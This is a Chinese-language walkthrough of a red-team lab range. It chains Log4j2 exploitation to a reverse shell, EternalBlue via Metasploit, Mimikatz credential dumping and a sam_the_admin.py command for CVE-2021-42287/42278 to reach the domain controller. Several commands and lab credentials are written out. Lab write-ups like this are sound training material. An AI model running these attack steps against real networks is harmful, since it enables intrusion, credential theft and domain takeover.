<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="ab8808b772eb7d91bdcf7b590b051405">前言</h2>
<p>本次靶场是 <strong>渗透攻击红队</strong> 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：log4j2、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123029-6fe415aa-491d-1.png"/></p>
<h2 data-content="1" id="abb9c46ac9bb25fa7a6edcd8176430cd">信息搜集</h2>
<p>拿到 <code>IP</code> 对它进行常规 <code>TCP</code> 端口扫描：</p>
<pre><code>nmap -v -Pn -T3 -sV -n -sT --open -p 22,1222,2222,22345,23,21,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,389,902,1194,1080,88,38080 192.168.0.251</code></pre>
<p>发现了开放了两个端口 <code>22</code>、<code>38080</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123031-70f8ec40-491d-1.png"/></p>
<p>是一台 <code>Ubantu</code> ，可疑的是这个 <code>38080</code> 端口，访问发现是一个Web页面：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123032-7173e2d8-491d-1.png"/></p>
<p>于是尝试最近爆出的新漏洞 <code>CVE-2021-44228</code> 尝试看看能不能获取到 <code>dnslog</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123033-722d47dc-491d-1.png"/></p>
<p>发现存在 <code>CVE-2021-44228</code> 漏洞，得想办法拿到一个 Shell。</p>
<h2 data-content="1" id="b041d2dab7ca27a95994f223848aa94c">CVE-2021-44228 Attack</h2>
<p>首先红队人员的 VPS Kali（192.168.0.175） 开启一个 LDAP：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123034-7291a70e-491d-1.png"/></p>
<p>然后红队人员的 VPS Kali（192.168.0.175）使用 nc 监听端口 9999:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123034-72f3c20e-491d-1.png"/></p>
<p>最后使用 EXP 成功反弹 Shell ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123035-73793484-491d-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123036-73fc04e0-491d-1.png"/></p>
<p>发现当前拿到的 Shell 是一个 Docker 环境：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123037-746bbd26-491d-1.png"/></p>
<p>想办法逃逸发现均失败了，最后是在 <code>/root/</code> 目录下找到了 Flag 文件：</p>
<pre><code>flag{redteam.lab-1}

Congratulations, you got this: saul Saul123</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123037-74b83110-491d-1.png"/></p>
<p>得到了一个类似于账号密码的东西，因为刚刚使用 Nmap 扫描出来了一个 SSH 服务，会不会这个就是账号密码呢？</p>
<h2 data-content="1" id="662fa4dcad73ed37edf44e405cdb01e7">内网初步信息搜集</h2>
<p>尝试使用得到的账号密码登陆 SSH 发现登陆成功：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123038-75217404-491d-1.png"/></p>
<p>通过信息搜集发现当前机器是有两个网卡：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123039-75b1a696-491d-1.png"/></p>
<p>其中 <code>ens33</code> 是外网的网卡，<code>ens38</code> （10.0.1.6）是内网网卡，猜测有内网！</p>
<p>PS：<strong>在实战的内网渗透中：如果是在 <code>linux</code> 环境下的内网渗透尽量形成全部 <code>bash</code> 和 <code>python</code> 化，因为 <code>Linux</code> 都完全自带，而在 <code>windows</code> 下的内网渗透则尽量全部形成 <code>powershell</code>，<code>bat</code>、<code>vbs</code> 化，尽量不要过于依赖外部工具。</strong></p>
<p>所以我们用 <code>for</code> 循环 <code>ping</code> 一下 <code>ens38</code> 的 <code>C</code> 段：</p>
<pre><code>for i in 10.0.1.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123040-760b2ad6-491d-1.png"/></p>
<p>发现内网还有一台主机存活：<code>10.0.1.7</code></p>
<p>随后为了方便，我选择用 <code>frp</code> 把当前机器的流量代理出来：（过程省略）</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123040-766f879c-491d-1.png"/></p>
<p>然后使用 Metasploit 设置 Socks 对内网进行深度信息搜集；</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123041-76d94f1a-491d-1.png"/></p>
<p>使用 <code>smb</code> 版本探测模块对目标进行扫描：</p>
<pre><code>use auxiliary/scanner/smb/smb_version</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123042-77692d60-491d-1.png"/></p>
<p>发现目标 <code>10.0.1.7</code> 版本是 <code>Windows 7</code>，且存在域 <code>REDTEAM</code>。</p>
<p>既然是 <code>Win7</code>，那么是不是应该存在 <code>MS17-010</code> 呢？</p>
<h2 data-content="1" id="c285b7156dc45e14d3de2893de20c975">MS17-010 Attack</h2>
<p>随后尝试探测发现存在永恒之蓝：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123043-78005d20-491d-1.png"/></p>
<p>由于目标是内网不一定出网，随后我使用正向 <code>bind</code> 直接打过去：</p>
<div class="highlight"><pre><span></span>msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; show options 

Module options <span class="o">(</span>exploit/windows/smb/ms17_010_eternalblue<span class="o">)</span>:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         <span class="m">10</span>.0.1.7         yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
   RPORT          <span class="m">445</span>              yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
   SMBDomain      .                no        <span class="o">(</span>Optional<span class="o">)</span> The Windows domain to use <span class="k">for</span> authentication
   SMBPass                         no        <span class="o">(</span>Optional<span class="o">)</span> The password <span class="k">for</span> the specified username
   SMBUser                         no        <span class="o">(</span>Optional<span class="o">)</span> The username to authenticate as
   VERIFY_ARCH    <span class="nb">true</span>             yes       Check <span class="k">if</span> remote architecture matches exploit Target.
   VERIFY_TARGET  <span class="nb">true</span>             yes       Check <span class="k">if</span> remote OS matches exploit Target.


Payload options <span class="o">(</span>windows/x64/meterpreter/bind_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   LPORT     <span class="m">4444</span>             yes       The listen port
   RHOST     <span class="m">10</span>.0.1.7         no        The target address


Exploit target:

   Id  Name
   --  ----
   <span class="m">0</span>   Windows <span class="m">7</span> and Server <span class="m">2008</span> R2 <span class="o">(</span>x64<span class="o">)</span> All Service Packs
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123044-78773814-491d-1.png"/></p>
<p>拿到 Win7 权限后加载 Mimikatz 先把密码抓出来：</p>
<pre><code>Username  Domain   Password
--------  ------   --------
root      REDTEAM  Red12345</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123045-7935a006-491d-1.png"/></p>
<p>这个时候得到了一个域用户账号。</p>
<h2 data-content="1" id="7f9387e17bd317d0038b74eb29f2dff4">内网渗透之大杀器 - CVE-2021-42287、CVE-2021-42278</h2>
<p>通过对当前内网进行信息搜集发现当前 <code>Win7</code> 机器还有一个内网网卡：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123046-79ab0b5c-491d-1.png"/></p>
<p>且定位到域控到域控 <code>IP</code> 为 <code>10.0.0.12</code> :</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123046-79fac53e-491d-1.png"/></p>
<p>由于最近爆出了两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278，尝试看看能不能直接利用。</p>
<p>具体原理是：假如域内有一台域控名为 DC（域控对应的机器用户为 DC$），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户 saulGoodman$，再把机器用户 saulGoodman$ 的 sAMAccountName 改成 DC。然后利用 DC 去申请一个TGT票据。再把 DC 的sAMAccountName 改为 saulGoodman$。这个时候 KDC 就会判断域内没有 DC 和这个用户，自动去搜索 DC$（DC$是域内已经的域控DC 的 sAMAccountName），攻击者利用刚刚申请的 TGT 进行 S4U2self，模拟域内的域管去请求域控 DC 的 ST 票据，最终获得域控制器DC的权限。</p>
<p>具体可以看我团队成员的公众号：<strong>红队攻防实验室</strong> 发布的文章，这里就不多赘述。</p>
<p>于是直接使用 MSF 添加了一个 Socks：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123047-7a4b1408-491d-1.png"/></p>
<p>然后添加路由：</p>
<pre><code>run autoroute -s 10.0.0.7/24</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123047-7a966f70-491d-1.png"/></p>
<p>由于是 socks5 协议，我本地修改了配置文件然后直接利用脚本：</p>
<pre><code>python3 sam_the_admin.py "redteam/root:Red12345" -dc-ip 10.0.0.12 -shell</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123048-7b180e90-491d-1.png"/></p>
<p>最后也是拿到了最终的 Flag。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011123049-7b9cdb16-491d-1.png"/></p>
<p>最终完成了本次靶场通关考核。</p>
</div>
</div>